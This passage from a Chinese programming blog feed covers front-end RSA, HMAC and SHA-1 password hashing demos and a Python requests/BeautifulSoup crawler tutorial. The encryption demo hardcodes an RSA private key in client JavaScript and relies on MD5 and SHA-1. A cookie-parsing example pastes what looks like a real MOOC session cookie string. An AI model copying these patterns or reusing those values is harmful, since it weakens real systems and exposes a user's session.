class="string">&quot;js/jsencrypt.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="keyword">var</span> str = <span class="string">&quot;密码&quot;</span>;</span><br><span class="line"><span class="comment">// 公钥</span></span><br><span class="line"><span class="keyword">var</span> publicKey = <span class="string">&quot;MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCfp4T5UK76SfSvn1wr4+PyStkHWONLVITZp5JLkFkHpiERchwShET+WVlLsbbgyt7Yt/boMoxr+XTD2NXd1gPvq11OU3dNYLE5hL2j8BCBw8EswkCbP+GgYdGF3FRw4eGURA4fcSO44IKuWtmtSyw7y1OMqzMUb6PROXrMFbrntQIDAQAB&quot;</span>;</span><br><span class="line"><span class="comment">// 私钥</span></span><br><span class="line"><span class="keyword">var</span> privateKey = <span class="string">&quot;MIICdQIBADANBgkqhkiG9w0BAQEFAASCAl8wggJbAgEAAoGBAJ+nhPlQrvpJ9K+fXCvj4/JK2QdY40tUhNmnkkuQWQemIRFyHBKERP5ZWUuxtuDK3ti39ugyjGv5dMPY1d3WA++rXU5Td01gsTmEvaPwEIHDwSzCQJs/4aBh0YXcVHDh4ZREDh9xI7jggq5a2a1LLDvLU4yrMxRvo9E5eswVuue1AgMBAAECgYBBGEtmX9hIIplKdf5dwtgw9QWSMlLSZw6Xs/Q5LQyvyrOW6mC5yAZdck6vRzFabDz6Pd/FAr8wUxChvapNfbIyhCsyAuqjVWV/aGDhaauQvwm3MrZ33jnMxI1z9UXPHTzWrYOltv/cKVqvDTKzEokDoTzEVLQClaYcEVMwhRrpYQJBANR48h9o1s7y0sAOoVBo5ktGZhb6gHtwNJ4Yw7Aey2bAWjgU4PevUq985+jBWhdAj81dZ0lMwARBIcYzyo0RLMkCQQDAXIup+fViw0BD+gl36kOo5RkTgz3aoALJsDBLGWi2J9QY9i0UZO9LsjNlYlTldKRzJWkhjdAdxuZe+8Mr8tWNAkB39HB92yqrW9wwIhJg21hpVy17+6FeD1MljsWsQTaEpERLNT5tl8YO3W3wsniyd/i38OvHLlWaEUuIIuVQD0pBAkAFXk/ThZNQl0xi2UaMXzBWNVaW0dHXGSIayN0AK4xdkQz9SVmGuS5oeWevy6e84513TTL66b9GJXfmbLZMsrE9AkAXuppwZW4I/xWZ2RaIsKqyyYYJUPbZ9HT3iO6FSUVPskzaOIPgU9sir+UcvJfWgXDWQ2F/4uUogB2ZS45YcFM8&quot;</span>;</span><br><span class="line"><span class="comment">// 加密</span></span><br><span class="line"><span class="keyword">var</span> encrypt = <span class="keyword">new</span> JSEncrypt();</span><br><span class="line">encrypt.setPublicKey(publicKey);</span><br><span class="line"><span class="keyword">var</span> encryptStr = encrypt.encrypt(str);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;加密后：&quot;</span> + encryptStr);</span><br><span class="line"><span class="comment">// 解密</span></span><br><span class="line"><span class="keyword">var</span> decrypt = <span class="keyword">new</span> JSEncrypt();</span><br><span class="line">decrypt.setPrivateKey(privateKey);</span><br><span class="line"><span class="keyword">var</span> decryptStr = decrypt.decrypt(encryptStr);</span><br><span class="line"><span class="built_in">console</span>.log( <span class="string">&quot;解密后：&quot;</span> + decryptStr);</span><br></pre></td></tr></table></figure><hr><p>生成带时间戳的密码：<br>(1) ——使用客户端时间生成带时间戳的密码——</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">(NSString *)timePassword&#123;</span><br><span class="line">//<span class="number">1.</span>设置密钥key</span><br><span class="line">NSString *key = @<span class="string">&quot;itheima&quot;</span>.md5String;</span><br><span class="line">//<span class="number">2.</span>使用密钥key对密码进行HMac</span><br><span class="line">NSString *pwd = [self.passField.texthmacMD5StringWithKey:key];</span><br><span class="line">NSLog(@<span class="string">&quot;key = %@&quot;</span>,key);</span><br><span class="line">//<span class="number">3.</span>获得当前的系统时间</span><br><span class="line">NSDateFormatter *fmt = [[NSDateFormatter alloc] init];</span><br><span class="line">//指定时区，真机通常需要指定时区</span><br><span class="line">fmt.locale = [[NSLocale alloc] initWithLocaleIdentifier:@<span class="string">&quot;zh&quot;</span>];</span><br><span class="line">//设置时间格式</span><br><span class="line">fmt.dateFormat = @<span class="string">&quot;yyyy-MM-dd HH:mm&quot;</span>;</span><br><span class="line">//格式化当前时间</span><br><span class="line">NSString *dateStr = [fmt stringFromDate:[NSDate date]];</span><br><span class="line">//<span class="number">4.</span>用密码+ 时间 生成密码</span><br><span class="line">pwd =[pwd stringByAppendingString:dateStr];</span><br><span class="line">//<span class="number">5.</span>返回hmac 结果</span><br><span class="line"><span class="keyword">return</span> [pwd hmacMD5StringWithKey:key];</span><br><span class="line">&#125;</span><br><span class="line">NSString *password = [self timePassword];</span><br></pre></td></tr></table></figure><p>(2) ——使用服务器时间,生成带时间戳的密码—–</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">(NSString *)timePassword&#123;</span><br><span class="line">//<span class="number">1.</span>设置密钥key</span><br><span class="line">NSString *key = @<span class="string">&quot;itheima&quot;</span>.md5String;</span><br><span class="line">//<span class="number">2.</span>对密钥key对密码进行HMac</span><br><span class="line">NSString *pwd = [self.passField.text hmacMD5StringWithKey:key];</span><br><span class="line">//<span class="number">3.</span>获得当前服务器的系统时间</span><br><span class="line">NSURL*url = [NSURL URLWithString:@<span class="string">&quot;[http://localhost/hmackey.php](http://localhost/hmackey.php)&quot;</span>];</span><br><span class="line">//使用同步获取时间(注意：这里要使用同步,确定先获得服务器的时间,后面的代码才能执行)</span><br><span class="line">NSData *timeData = [NSData dataWithContentsOfURL:url];</span><br><span class="line">//反序列化取出时间</span><br><span class="line">NSDictionary *<span class="built_in">dict</span> = [NSJSONSerialization JSONObjectWithData:timeData options:<span class="number">0</span> error:NULL];</span><br><span class="line">NSString *dateStr = <span class="built_in">dict</span>[@<span class="string">&quot;key&quot;</span>];</span><br><span class="line">//<span class="number">4.</span>用密码+ 时间 生成密码</span><br><span class="line">pwd =[pwd stringByAppendingString:dateStr];</span><br><span class="line">//<span class="number">5.</span>返回hmac 结果</span><br><span class="line"><span class="keyword">return</span> [pwd hmacMD5StringWithKey:key];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="sha1加密"><a href="#sha1加密" class="headerlink" title="sha1加密"></a>sha1加密</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;js/sha1.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="keyword">var</span> sha = hex_sha1(<span class="string">&#x27;mima123465&#x27;</span>);</span><br><span class="line"><span class="built_in">console</span>.log(sha);</span><br></pre></td></tr></table></figure><hr><p>参考：<br>base64:<br><a href="https://blog.csdn.net/pengjunlee/article/details/91127222?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3">https://blog.csdn.net/pengjunlee/article/details/91127222?depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3&amp;utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-3</a></p><p>时间戳：<br><a href="https://www.cnblogs.com/shenyiyangle/p/10686038.html">https://www.cnblogs.com/shenyiyangle/p/10686038.html</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>爬虫入坑</title>
      <link href="/2020/03/23/web_crawler/"/>
      <url>/2020/03/23/web_crawler/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="爬虫步骤"><a href="#爬虫步骤" class="headerlink" title="爬虫步骤"></a>爬虫步骤</h2><ul><li>1.抓取目标url</li><li>2.使用python代码发请求获取数据</li><li>3.解析获取到的数据<br>   找新的url回到第一步(自动化)</li><li>4.数据持久化</li></ul><h2 id="python3爪巴虫模块"><a href="#python3爪巴虫模块" class="headerlink" title="python3爪巴虫模块"></a>python3爪巴虫模块</h2><ul><li>原生模块:<br>urlib , request<br>(1) urlopen<br>(2) get传参<br>(3) post<br>(4) handle处理器的定义<br>(5) urlError</li></ul><h2 id="xpath-bs4-数据解析"><a href="#xpath-bs4-数据解析" class="headerlink" title="xpath bs4(数据解析)"></a>xpath bs4(数据解析)</h2><h2 id="数据存储"><a href="#数据存储" class="headerlink" title="数据存储"></a>数据存储</h2><hr><p>网页特征：<br>url连接地址；<br>协议http、https；<br>使用HTML代码 ；</p><p>网页抓包流程:<br>1、 请求网址得到网页源代码<br>2、 在源代码中解析，获取数据<br>3、 如果网站中包含链接，则继续执行1~2步骤</p><p>.  :除换行外的任意字符</p><ul><li> :前面的字符可以出现任意次<br>() :打印出来的东西<br>?  :出现1次或0次</li></ul><hr><table><thead><tr><th>属性</th><th>介绍</th></tr></thead><tbody><tr><td>src</td><td>资源路径</td></tr><tr><td>class</td><td>标签的类</td></tr><tr><td>href</td><td>链接地址</td></tr><tr><td>title</td><td>显示的文本</td></tr><tr><td>id</td><td>标签的唯一标识</td></tr></tbody></table><hr><p>get请求：<br>网址直接在地址栏里面，其中大部分请求都是get请求</p><p>post请求：<br>请求的时候会隐藏参数一般用于登录、注册或者填写内容提交</p><hr><p>状态码：<br>1** 正在请求<br>2** 请求成功<br>3** 网站的跳转或重定向<br>4** 请求资源不存在<br>5** 服务器内部错误，</p><hr><h3 id="str转bytes叫encode，bytes转str叫decode"><a href="#str转bytes叫encode，bytes转str叫decode" class="headerlink" title="str转bytes叫encode，bytes转str叫decode"></a>str转bytes叫encode，bytes转str叫decode</h3><p>字符串就是unicode字符数组</p><hr><p>进入python环境下下载</p><h3 id="request模块："><a href="#request模块：" class="headerlink" title="request模块："></a>request模块：</h3><p>E:\Python-path&gt;pip install request -i <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a><br><img src="1.png"><br>response = requests.get(url,headers = ,params= ,stream=Bool)<br>|属性| 介绍 |<br>|–|–|<br>|headers | 请求消息的时候附加的消息头 |<br>|User-Agent | 用户表示 |<br>|Referer | 来源页 |<br>|params | 请求附带参数（也可以通过？的方式，直接拼接在url后面）|<br>|stream | 使用流进行传输，如果开启的话，在请求页面的时候，只得到返回消息头，内容部\分一部分一部分截下来（用于大文件）|<br>|proxies |设置代理 |<br>|timeout |设置超时的时间 |<br>|verify |是否强制验证证书 |</p><p>测试ip代理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://httpbin.org/get&quot;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;138.197.169.148:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.get(url,proxies=proxies)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line">result = r.json()</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(result))</span><br><span class="line"><span class="built_in">print</span>(result[<span class="string">&#x27;origin&#x27;</span>]) <span class="comment">#本机ip</span></span><br></pre></td></tr></table></figure><h4 id="response（返回值）模块"><a href="#response（返回值）模块" class="headerlink" title="response（返回值）模块"></a>response（返回值）模块</h4><table><thead><tr><th>属性</th><th>介绍</th></tr></thead><tbody><tr><td>status</td><td>code 返回的状态码</td></tr><tr><td>encoding</td><td>网页的编码</td></tr><tr><td>text</td><td>返回网页的源代码，可以自动解析（可能出现乱码）</td></tr><tr><td>content</td><td>返回内容的字节码，可以使用decode()解析中文</td></tr><tr><td>json()</td><td>把json字符串变成python的数据类型（不同编程语言之间的数据交互）</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="comment">#json—&gt;python json.loads()  </span></span><br><span class="line"><span class="comment">#python—&gt; json json.dumps()</span></span><br><span class="line">json_str =<span class="string">&#x27;&#x27;&#x27;&#123;&quot;name&quot;:&quot;dog&quot;,&quot;age&quot;:19&#125;&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(json_str)</span><br><span class="line">json_python = json.loads(json_str)<span class="comment">#字符串——&gt;字典</span></span><br><span class="line">json_str1 = json.dumps(json_python)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(json_python))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(json_str1))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(json_str))</span><br></pre></td></tr></table></figure><p>response使用实例:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">requests.get(url)  <span class="comment">#发起请求</span></span><br><span class="line"><span class="built_in">print</span>(response.status_code)  <span class="comment">#返回状态码 200  print (response)#&lt;Response [200]&gt;</span></span><br><span class="line"><span class="built_in">print</span>(response.text)  <span class="comment">#返回网页源代码,可能会乱码</span></span><br><span class="line"><span class="built_in">print</span>(response.content)  <span class="comment">#源代码的二进制字节码</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>网页中查找charset——&gt;查看编码 或 print(response.encoding)</p><p>用utf-8 解析二进制编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><p><code>http://httpbin.org/get </code> 用于测试</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://httpbin.org/get&#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response =requests.get(url,headers = headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="./2.png"></p><p>伪装成浏览器访问，User-Agent 用户代理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>伪装用户登录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">url = &#x27;http://httpbin.org/post&#x27;</span><br><span class="line">data =&#123;</span><br><span class="line">    &#x27;username&#x27;:&#x27;123&#x27;,</span><br><span class="line">    &#x27;Lain&#x27;:&#x27;123&#x27;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#resp= requests.post(url,data=data)   //放在form里面</span><br><span class="line"></span><br><span class="line">print(resp.text)</span><br></pre></td></tr></table></figure><p><img src="/3.png"></p><p>parmas参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url =<span class="string">&quot;https://q0o0p.top/&quot;</span></span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>:<span class="number">12</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.get(url,params=params)</span><br><span class="line"><span class="built_in">print</span>(response.text) <span class="comment">#相当于https://q0o0p.top/?id=12</span></span><br></pre></td></tr></table></figure><hr><h3 id="爪巴视频"><a href="#爪巴视频" class="headerlink" title="爪巴视频"></a>爪巴视频</h3><p>处理视频使用流(stream)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url =<span class="string">&quot;  &quot;</span>   <span class="comment">#</span></span><br><span class="line">response = requests.get(url,stream = <span class="literal">True</span>)  <span class="comment">#使用流</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./data/xxx.mp4&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:  <span class="comment">#保存到当前目录下的data文件夹,&#x27;wb&#x27;格式</span></span><br><span class="line">    <span class="comment">#for j in response.iter_content(1024*10):  #一小段一小段的读取</span></span><br><span class="line">        <span class="comment">#file.write(j)</span></span><br><span class="line">    file.write(response.content)</span><br></pre></td></tr></table></figure><h2 id="爪巴图片"><a href="#爪巴图片" class="headerlink" title="爪巴图片"></a>爪巴图片</h2><ol><li>没有反爬虫的(有些图片url缺少http——&gt;简单反爬虫)<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;http://i1.hdslb.com/bfs/archive/cd72ee2b75ad5827cc48c554c800d4dbb9d355b6.jpg&#x27;</span></span><br><span class="line">response = requests.get(url,headers=headers)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./img/1.jpg&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:  <span class="comment">#&#x27;w&#x27;:写，&#x27;b&#x27;：二进制</span></span><br><span class="line"></span><br><span class="line">    file.write(response.content)</span><br></pre></td></tr></table></figure></li></ol><h2 id="爪巴HTML"><a href="#爪巴HTML" class="headerlink" title="爪巴HTML"></a>爪巴HTML</h2><p>注意有时候要加 <code>encoding=&quot;utf-8&quot;</code><br>不加会报错UnicodeEncodeError: ‘gbk’ codec can’t encode character ‘\xa0’ in position 50189: illegal multibyte sequence</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;https://www.bilibili.com/video/BV1VW411f7UV/?spm_id_from=333.788.videocard.9&#x27;</span></span><br><span class="line">response = requests.get(url,headers= headers)</span><br><span class="line">html = response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./img/index.html&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(html)</span><br><span class="line"></span><br></pre></td></tr></table></figure><hr><h3 id="正则爬取"><a href="#正则爬取" class="headerlink" title="正则爬取"></a>正则爬取</h3><h3 id="字符串转字典"><a href="#字符串转字典" class="headerlink" title="字符串转字典"></a>字符串转字典</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = <span class="string">&#x27;k8s=eac701e36bdf559963ed064b2f08d38c96da8607; route=ce3aca120f3fcc9eb76807ea1ee5aae1; lv=1; fid=1033; _uid=80500486; uf=b2d2c93beefa90dcc0ca6f432de31ca7045252693c5fa6cedb7a6ede12672e4415f8e55178ba6119fd17de198d2569adc49d67c0c30ca5047c5a963e85f1109914bde237bd8e14aace71fc6e59483dd3ad4c2cfc9b1efcabf13236f383c23401caa95d6e1c66be08; _d=1587568890815; vc=12FA607994A506E2519CB2F269313F88; vc2=5B7E8D844BD6D11407B3573E03B9B2A8; vc3=Vsg9ZpIj%2FY8RDKxwr8o6dNAwjG6taW1b57X6%2BBWBD%2FCUyzO2cJXVfgWRhorqOD%2FUotfaf2L%2BBHIgSnDrSMn9c28bacj0hxrCKKduaW3U78ykD%2FvJgksVf2TBa4leeZV5PQjsfKX10%2FVHA8SrG8%2F8GNhyUG9XbjQHVFH8hZZZIXU%3D1f73825baad3a24f9abc0e0a35ac9834; xxtenc=c5ddedc1f2579e9a6315e6f75b31c0b9; DSSTASH_LOG=C_38-UN_593-US_80500486-T_1587568890818; fanyamoocs=D663BEEDF192F90C11401F839C536D9E; pid=1033; isfyportal=1; ptrmooc=t; thirdRegist=0; tl=1; jrose=E2860F48CAC661826B689493C0F5AD5F.mooc-portal-2046835149-1xl1s&#x27;</span></span><br><span class="line">x =re.split(<span class="string">&#x27;[\;\=]+&#x27;</span>,p)</span><br><span class="line"><span class="comment"># print(x)</span></span><br><span class="line"><span class="comment">#方法一</span></span><br><span class="line">y=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(x),<span class="number">2</span>):</span><br><span class="line">    y[x[i]]=x[i+<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line"><span class="comment">#方法二：</span></span><br><span class="line">z=<span class="built_in">dict</span>(<span class="built_in">zip</span>(x[<span class="number">0</span>::<span class="number">2</span>],x[<span class="number">1</span>::<span class="number">2</span>]))</span><br><span class="line"><span class="built_in">print</span>(z)</span><br></pre></td></tr></table></figure><h3 id="处理中文字符"><a href="#处理中文字符" class="headerlink" title="处理中文字符"></a>处理中文字符</h3><ul><li>简单拼接<br><code>encode_url = urllib.parse.quote(url,safe = string.printable)</code><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="comment"># https://cn.bing.com/search?q=爬虫框架</span></span><br><span class="line"><span class="comment"># https://cn.bing.com/search?q=%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6</span></span><br><span class="line">u = <span class="string">&quot;https://cn.bing.com/search?q=&quot;</span></span><br><span class="line">    name= <span class="string">&#x27;爬虫框架&#x27;</span></span><br><span class="line">    url= u+name</span><br><span class="line">    <span class="built_in">print</span>(url) </span><br><span class="line">    <span class="comment"># python不接受中文,汉字需要进行转译</span></span><br><span class="line">    encode_url = urllib.parse.quote(url,safe = string.printable)</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h2><ul><li>1、bs4模板<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLtext</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillunivlist</span>(<span class="params">ulist,html</span>):</span></span><br><span class="line">    soup=BeautifulSoup(html,<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">&#x27;tbody&#x27;</span>).children:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tr,bs4.element.Tag):</span><br><span class="line">            tds=tr(<span class="string">&#x27;td&#x27;</span>)</span><br><span class="line">            ulist.append([tds[<span class="number">0</span>].string,tds[<span class="number">1</span>].string,tds[<span class="number">3</span>].string])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printlist</span>(<span class="params">ulist,num</span>):</span></span><br><span class="line">    tplt=<span class="string">&quot;&#123;0:^10&#125;\t&#123;1:&#123;3&#125;^10&#125;\t&#123;2:^10&#125;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(tplt.<span class="built_in">format</span>(<span class="string">&quot;排名&quot;</span>,<span class="string">&quot;学校名称&quot;</span>,<span class="string">&quot;总分&quot;</span>,<span class="built_in">chr</span>(<span class="number">12288</span>)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        u=ulist[i]</span><br><span class="line">        <span class="built_in">print</span>(tplt.<span class="built_in">format</span>(u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>],<span class="built_in">chr</span>(<span class="number">12288</span>)))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    uinfo=[]</span><br><span class="line">    url=<span class="string">&#x27;http://www.zuihaodaxue.cn/zuihaodaxuepaiming2019.html&#x27;</span></span><br><span class="line">    html=getHTMLtext(url)</span><br><span class="line">    fillunivlist(uinfo,html)</span><br><span class="line">    printlist(uinfo,<span class="built_in">len</span>(uinfo))</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Python有趣的模块库</title>
      <link href="/2020/03/09/Python/"/>
      <url>/2020/03/09/Python/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>python基础知识总结的感觉还行，python会用就OK，就懒得总结了<br><a href="https://www.cnblogs.com/liuhuacai/category/1431456.html">https://www.cnblogs.com/liuhuacai/category/1431456.html</a><br>基础递归：<br><a href="https://www.cnblogs.com/schut/p/10625111.html">https://www.cnblogs.com/schut/p/10625111.html</a></p><hr><h3 id="全自动安装"><a href="#全自动安装" class="headerlink" title="全自动安装"></a>全自动安装</h3><p>pip install XXX</p><h3 id="半自动安装"><a href="#半自动安装" class="headerlink" title="半自动安装"></a>半自动安装</h3><p>如果是.whl<br>pip install XXX.whl<br>windows： 手动下载，解压缩<br>然后python setup.py install</p><h3 id="手动安装"><a href="#手动安装" class="headerlink" title="手动安装"></a>手动安装</h3><p>放置site-package 目录下</p><h3 id="pip解决下载速度慢问题"><a href="#pip解决下载速度慢问题" class="headerlink" title="pip解决下载速度慢问题"></a>pip解决下载速度慢问题</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span 